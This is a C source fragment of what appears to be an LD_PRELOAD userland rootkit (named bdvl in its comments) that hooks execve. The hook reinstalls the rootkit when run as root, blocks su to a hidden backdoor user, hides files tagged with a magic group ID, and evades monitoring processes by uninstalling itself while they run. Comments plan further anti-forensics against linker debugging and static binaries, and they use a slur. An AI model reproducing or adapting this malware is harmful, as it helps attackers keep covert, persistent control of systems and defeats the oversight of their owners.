int execve(const char *filename, char *const argv[], char *const envp[])
{
    HOOK(o_execve, CEXECVE);
    //HOOK(o_unlink,CUNLINK);
    if(is_bdusr()) return o_execve(filename,argv,envp);
    if(geteuid() == 0) reinstall();

    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(strstr(filename,"su") && argv[1] && !strcmp(argv[1], bduname)) { CLEAN(bduname); errno=EIO; return -1; }
    CLEAN(bduname);

    if(hxstat(filename,MGID,32)) { errno=ENOENT; return -1; }

    int i=0, ret=0;
    // check for gay procs, first i need to make the array in bdvl.sh and have it written
    // to the header
    // uninstall while gay proc is still running, then reinstall after
    for(i=0;i<HPROCS_SIZE;i++)
    {
        char *cproc=strdup(hprocs_calls[i]); xor(cproc);
        int checkcproc=hbdvl(filename, cproc, ret);
        CLEAN(cproc);

        if(checkcproc == 1) exit(0);
        else if(checkcproc == 0) { errno=EIO; return -1; } // user isn't root so we can't hide from them, return error
        else if(checkcproc == -1) return -1;
        else if(checkcproc == 2) return o_execve(filename,argv,envp);
        else continue;
    }



    // check for | ldlinuxso or ldso | in filename, uninstall then reinstall after
    //
    // check for dynamic linker debugging env vars in envp and do the same as above
    //
    // check if LD_PRELOAD is initialised in the environment, and check if LIBC_PATH
    // is present anywhere in envp, just return permissions error
    //
    // return permissions error for any attempts to read strings from the rk SO or
    // the dynamic linker libs
    //
    // consider doing something with disabling static compilation of binaries,
    // if a user is trying to run gcc with the -static flags, make a new char array
    // and essentially copy envp to it, then we sub in the -static flag for a useless
    // flag, or we just remove the flag from the array completely and then return
    // o_execve with our new envp
    //

    

    return o_execve(filename,argv,envp);
}
